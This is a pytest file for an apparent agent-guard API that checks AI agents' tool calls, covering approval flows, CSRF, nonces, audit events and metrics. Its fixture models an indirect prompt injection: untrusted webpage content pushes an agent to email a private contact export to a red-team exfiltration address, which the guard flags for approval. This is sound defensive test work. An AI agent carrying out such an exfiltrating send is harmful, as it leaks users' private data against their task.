from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from agentguard_core.settings import CoreSettings
from agentguard_core.storage.memory import MemoryCoreStore
from guard_api.auth import ApiAuthError, CapabilityAuthService
from guard_api.main import create_app


class FailingHealthStore(MemoryCoreStore):
    def health_check(self) -> bool:
        return False


class TrackingInitializeStore(MemoryCoreStore):
    def __init__(self) -> None:
        super().__init__()
        self.initialize_count = 0

    def initialize(self) -> None:
        self.initialize_count += 1


class FailingInitializeStore(MemoryCoreStore):
    def initialize(self) -> None:
        raise RuntimeError("core initialize failed")


def _tool_call_payload() -> dict:
    return {
        "schema_version": "0.3",
        "event_id": "evt_test",
        "event_type": "tool_call_proposed",
        "runtime": "langgraph",
        "trace_id": "trace_api",
        "case_id": "PI-API",
        "attack_type": "indirect_prompt_injection",
        "is_malicious": True,
        "timestamp": "2026-06-11T00:00:00+00:00",
        "security_context": {
            "user_task": "Complete the visible web form only",
            "source_type": "webpage",
            "source_trust": "untrusted",
        },
        "tool": {
            "name": "send_email",
            "category": "message",
            "kind": "email_send",
            "call_id": "call_api",
        },
        "arguments": {
            "to": "exfiltration-intake@red-team.agentguard.local",
            "subject": "contact export",
            "body": "private contact export",
        },
        "derived_resources": [],
        "pre_execution": True,
        "metadata": {},
    }


def test_evaluate_tool_call_requires_adapter_token() -> None:
    app = create_app(store=MemoryCoreStore(), settings=CoreSettings(adapter_token="adapter-secret"))
    client = TestClient(app)

    response = client.post("/v1/evaluate/tool-call", json=_tool_call_payload())

    assert response.status_code == 401
    assert response.json()["error"]["code"] == "AUTH_MISSING"


def test_health_is_lightweight_by_default() -> None:
    app = create_app(store=FailingHealthStore())
    client = TestClient(app)

    response = client.get("/health")

    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_health_can_check_database_success() -> None:
    app = create_app(store=MemoryCoreStore())
    client = TestClient(app)

    response = client.get("/health?check_db=true")

    assert response.status_code == 200
    assert response.json() == {"status": "ok", "database": "ok"}


def test_health_can_report_database_failure() -> None:
    app = create_app(store=FailingHealthStore())
    client = TestClient(app)

    response = client.get("/health?check_db=true")

    assert response.status_code == 503
    assert response.json() == {"status": "degraded", "database": "error"}


def test_auth_state_survives_new_auth_service_instance() -> None:
    settings = CoreSettings(control_token="control-secret")
    store = MemoryCoreStore()
    first_auth = CapabilityAuthService(settings=settings, store=store)

    launch_code = first_auth.create_launch_code()
    second_auth = CapabilityAuthService(settings=settings, store=store)
    session = second_auth.exchange_launch_code(launch_code)
    third_auth = CapabilityAuthService(settings=settings, store=store)

    restored = third_auth.verify_browser_session(session.session_id)
    nonce = third_auth.issue_approval_nonce(
        approval_id="app_cross_instance",
        session_id=session.session_id,
        tool_call_id="call_cross_instance",
    )
    fourth_auth = CapabilityAuthService(settings=settings, store=store)
    fourth_auth.consume_approval_nonce(
        nonce=nonce,
        approval_id="app_cross_instance",
        session_id=session.session_id,
        tool_call_id="call_cross_instance",
    )

    assert restored.session_id == session.session_id
    assert restored.csrf_token == session.csrf_token
    with pytest.raises(ApiAuthError) as reused_launch:
        second_auth.exchange_launch_code(launch_code)
    assert reused_launch.value.code == "LAUNCH_CODE_INVALID"
    with pytest.raises(ApiAuthError) as reused_nonce:
        third_auth.consume_approval_nonce(
            nonce=nonce,
            approval_id="app_cross_instance",
            session_id=session.session_id,
            tool_call_id="call_cross_instance",
        )
    assert reused_nonce.value.code == "APPROVAL_NONCE_INVALID"


def test_auth_state_rejects_expired_values() -> None:
    store = MemoryCoreStore()
    expired_launch_auth = CapabilityAuthService(
        settings=CoreSettings(control_token="control-secret", launch_code_ttl_seconds=-1),
        store=store,
    )
    expired_code = expired_launch_auth.create_launch_code()

    with pytest.raises(ApiAuthError) as launch_error:
        expired_launch_auth.exchange_launch_code(expired_code)
    assert launch_error.value.code == "LAUNCH_CODE_EXPIRED"

    expired_session_auth = CapabilityAuthService(
        settings=CoreSettings(control_token="control-secret", browser_session_ttl_seconds=-1),
        store=MemoryCoreStore(),
    )
    session_code = expired_session_auth.create_launch_code()
    expired_session = expired_session_auth.exchange_launch_code(session_code)
    with pytest.raises(ApiAuthError) as session_error:
        expired_session_auth.verify_browser_session(expired_session.session_id)
    assert session_error.value.code == "SESSION_EXPIRED"

    expired_nonce_auth = CapabilityAuthService(
        settings=CoreSettings(control_token="control-secret", approval_nonce_ttl_seconds=-1),
        store=MemoryCoreStore(),
    )
    nonce_code = expired_nonce_auth.create_launch_code()
    nonce_session = expired_nonce_auth.exchange_launch_code(nonce_code)
    expired_nonce = expired_nonce_auth.issue_approval_nonce(
        approval_id="app_expired",
        session_id=nonce_session.session_id,
        tool_call_id="call_expired",
    )
    with pytest.raises(ApiAuthError) as nonce_error:
        expired_nonce_auth.consume_approval_nonce(
            nonce=expired_nonce,
            approval_id="app_expired",
            session_id=nonce_session.session_id,
            tool_call_id="call_expired",
        )
    assert nonce_error.value.code == "APPROVAL_NONCE_INVALID"


def test_startup_initializes_core_store() -> None:
    store = TrackingInitializeStore()
    app = create_app(store=store, settings=CoreSettings(environment="development"))

    assert store.initialize_count == 0
    with TestClient(app) as client:
        assert store.initialize_count == 1
        response = client.get("/health")

    assert response.status_code == 200


def test_startup_fails_when_core_initialize_fails() -> None:
    app = create_app(store=FailingInitializeStore(), settings=CoreSettings(environment="development"))

    with pytest.raises(RuntimeError, match="core initialize failed"):
        with TestClient(app):
            pass


def test_ask_approval_resolve_and_wait_flow() -> None:
    settings = CoreSettings(adapter_token="adapter-secret", control_token="control-secret")
    app = create_app(store=MemoryCoreStore(), settings=settings)
    client = TestClient(app)

    decision_response = client.post(
        "/v1/evaluate/tool-call",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_tool_call_payload(),
    )
    assert decision_response.status_code == 200
    decision = decision_response.json()
    assert decision["decision"] == "ask"
    approval_id = decision["approval"]["approval_id"]

    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer control-secret"},
    )
    assert launch_response.status_code == 200
    launch_code = launch_response.json()["launch_code"]

    exchange_response = client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})
    assert exchange_response.status_code == 200
    csrf_token = exchange_response.json()["csrf_token"]

    pending_response = client.get("/v1/approvals/pending")
    assert pending_response.status_code == 200
    pending = pending_response.json()
    assert pending[0]["approval_id"] == approval_id
    approval_nonce = pending[0]["approval_nonce"]

    rejected_response = client.post(
        f"/v1/approvals/{approval_id}/resolve",
        json={"decision": "allow_once", "approval_nonce": approval_nonce},
    )
    assert rejected_response.status_code == 403
    assert rejected_response.json()["error"]["code"] == "CSRF_INVALID"

    resolve_response = client.post(
        f"/v1/approvals/{approval_id}/resolve",
        headers={"X-AgentGuard-CSRF": csrf_token},
        json={"decision": "allow_once", "approval_nonce": approval_nonce},
    )
    assert resolve_response.status_code == 200
    assert resolve_response.json()["status"] == "resolved"
    assert resolve_response.json()["decision"] == "allow_once"

    wait_response = client.get(
        f"/v1/approvals/{approval_id}/wait",
        headers={"Authorization": "Bearer adapter-secret"},
    )
    assert wait_response.status_code == 200
    assert wait_response.json()["decision"] == "allow_once"


def test_expired_approval_wait_returns_safe_default() -> None:
    settings = CoreSettings(adapter_token="adapter-secret", control_token="control-secret")
    store = MemoryCoreStore()
    app = create_app(store=store, settings=settings)
    client = TestClient(app)

    decision_response = client.post(
        "/v1/evaluate/tool-call",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_tool_call_payload(),
    )
    approval_id = decision_response.json()["approval"]["approval_id"]
    approval = store.approvals[approval_id]
    approval.expires_at = "2000-01-01T00:00:00+00:00"
    store.approvals[approval_id] = approval

    wait_response = client.get(
        f"/v1/approvals/{approval_id}/wait",
        headers={"Authorization": "Bearer adapter-secret"},
    )

    assert wait_response.status_code == 200
    assert wait_response.json() == {"status": "expired", "decision": "deny"}


def test_browser_logout_invalidates_session() -> None:
    settings = CoreSettings(control_token="control-secret")
    app = create_app(store=MemoryCoreStore(), settings=settings)
    client = TestClient(app)
    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer control-secret"},
    )
    launch_code = launch_response.json()["launch_code"]
    exchange_response = client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})
    assert exchange_response.status_code == 200

    logout_response = client.post("/v1/auth/browser/logout")
    me_response = client.get("/v1/auth/browser/me")

    assert logout_response.status_code == 200
    assert logout_response.json() == {"authenticated": False}
    assert me_response.status_code == 401
    assert me_response.json()["error"]["code"] == "SESSION_INVALID"


def test_evaluate_tool_call_writes_dashboard_audit_and_metrics() -> None:
    settings = CoreSettings(adapter_token="adapter-secret", control_token="control-secret")
    app = create_app(store=MemoryCoreStore(), settings=settings)
    client = TestClient(app)

    decision_response = client.post(
        "/v1/evaluate/tool-call",
        headers={"Authorization": "Bearer adapter-secret"},
        json=_tool_call_payload(),
    )
    assert decision_response.status_code == 200
    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer control-secret"},
    )
    launch_code = launch_response.json()["launch_code"]
    client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})

    events_response = client.get("/v1/audit/events")
    metrics_response = client.get("/v1/metrics/eval")

    assert events_response.status_code == 200
    event = events_response.json()[0]
    assert event["trace_id"] == "trace_api"
    assert event["case_id"] == "PI-API"
    assert event["decision"] == "ask"
    assert event["blocked"] is True
    assert event["attack_type"] == "indirect_prompt_injection"
    assert event["is_malicious"] is True
    assert event["resource_targets"] == ["exfiltration-intake@red-team.agentguard.local"]
    assert event["rule_hits"] == ["P005_external_send", "P004_task_mismatch"]
    assert event["links"]["event_id"] == "evt_test"
    assert event["latency_ms"] is not None
    assert metrics_response.status_code == 200
    assert metrics_response.json()["event_count"] == 1
    assert metrics_response.json()["ask_count"] == 1


def test_audit_events_can_be_filtered_for_dashboard() -> None:
    app = create_app(store=MemoryCoreStore(), settings=CoreSettings(adapter_token="adapter-secret"))
    client = TestClient(app)
    for audit_event in [
        _audit_event_payload(audit_id="audit_keep", trace_id="trace_keep", decision="deny", runtime="langgraph"),
        _audit_event_payload(audit_id="audit_skip", trace_id="trace_skip", decision="allow", runtime="langgraph"),
    ]:
        write_response = client.post(
            "/v1/audit/event",
            headers={"Authorization": "Bearer adapter-secret"},
            json=audit_event,
        )
        assert write_response.status_code == 200
    _login_dashboard(client)

    events_response = client.get("/v1/audit/events?trace_id=trace_keep&decision=deny&limit=5")

    assert events_response.status_code == 200
    events = events_response.json()
    assert [event["audit_id"] for event in events] == ["audit_keep"]


def test_metrics_can_be_filtered_for_dashboard() -> None:
    store = MemoryCoreStore()
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_allow",
            trace_id="trace_metric",
            decision="allow",
            runtime="langgraph",
            blocked=False,
            is_malicious=False,
            latency_ms=10,
        )
    )
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_deny",
            trace_id="trace_metric",
            decision="deny",
            runtime="langgraph",
            blocked=True,
            is_malicious=True,
            latency_ms=30,
        )
    )
    store.add_audit_event(
        _audit_event_model(
            audit_id="audit_metric_other",
            trace_id="trace_other",
            decision="ask",
            runtime="openclaw",
            blocked=True,
            is_malicious=False,
            latency_ms=50,
        )
    )
    app = create_app(store=store, settings=CoreSettings())
    client = TestClient(app)
    _login_dashboard(client)

    metrics_response = client.get("/v1/metrics/eval?runtime=langgraph")

    assert metrics_response.status_code == 200
    metrics = metrics_response.json()
    assert metrics["event_count"] == 2
    assert metrics["allow_count"] == 1
    assert metrics["deny_count"] == 1
    assert metrics["ask_count"] == 0
    assert metrics["blocked_count"] == 1
    assert metrics["block_rate"] == 0.5
    assert metrics["fpr"] == 0.0
    assert metrics["fnr"] == 0.0
    assert metrics["average_latency_ms"] == 20.0


def test_audit_event_round_trip_for_dashboard_fields() -> None:
    app = create_app(store=MemoryCoreStore(), settings=CoreSettings(adapter_token="adapter-secret"))
    client = TestClient(app)
    audit_event = {
        "audit_id": "audit_api",
        "schema_version": "0.3",
        "trace_id": "trace_api",
        "case_id": "PI-API",
        "runtime": "langgraph",
        "timestamp": "2026-06-11T00:00:00+00:00",
        "stage": "before_tool_call",
        "event_type": "tool_call_proposed",
        "summary": "Agent attempted to call send_email",
        "decision": "ask",
        "risk_score": 68,
        "severity": "medium",
        "blocked": True,
        "resource_targets": ["exfiltration-intake@red-team.agentguard.local"],
        "rule_hits": ["P005_external_send"],
        "reason": "External send requires approval.",
        "links": {"event_id": "evt_test", "decision_id": "dec_test"},
        "metadata": {},
        "attack_type": "indirect_prompt_injection",
        "is_malicious": True,
        "latency_ms": 2,
    }

    write_response = client.post(
        "/v1/audit/event",
        headers={"Authorization": "Bearer adapter-secret"},
        json=audit_event,
    )
    assert write_response.status_code == 200

    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer demo-control-token"},
    )
    launch_code = launch_response.json()["launch_code"]
    client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})

    events_response = client.get("/v1/audit/events")
    assert events_response.status_code == 200
    assert events_response.json()[0]["audit_id"] == "audit_api"


def _login_dashboard(client: TestClient) -> None:
    launch_response = client.post(
        "/v1/auth/browser/launch",
        headers={"Authorization": "Bearer demo-control-token"},
    )
    assert launch_response.status_code == 200
    launch_code = launch_response.json()["launch_code"]
    exchange_response = client.post("/v1/auth/browser/exchange", json={"launch_code": launch_code})
    assert exchange_response.status_code == 200


def _audit_event_payload(
    *,
    audit_id: str,
    trace_id: str,
    decision: str,
    runtime: str,
    blocked: bool | None = None,
    is_malicious: bool | None = None,
    latency_ms: int | None = 1,
) -> dict:
    blocked = decision in {"deny", "ask"} if blocked is None else blocked
    return {
        "audit_id": audit_id,
        "schema_version": "0.3",
        "trace_id": trace_id,
        "case_id": "case_api_filter",
        "runtime": runtime,
        "timestamp": "2026-06-11T00:00:00+00:00",
        "stage": "before_tool_call",
        "event_type": "tool_call_proposed",
        "summary": f"Audit {audit_id}",
        "decision": decision,
        "risk_score": 90 if blocked else 0,
        "severity": "critical" if blocked else "low",
        "blocked": blocked,
        "resource_targets": [],
        "rule_hits": [],
        "reason": "test audit event",
        "links": {},
        "metadata": {},
        "attack_type": "test",
        "is_malicious": is_malicious,
        "latency_ms": latency_ms,
    }


def _audit_event_model(**kwargs):
    from agentguard_core.models import AuditEvent

    return AuditEvent.model_validate(_audit_event_payload(**kwargs))
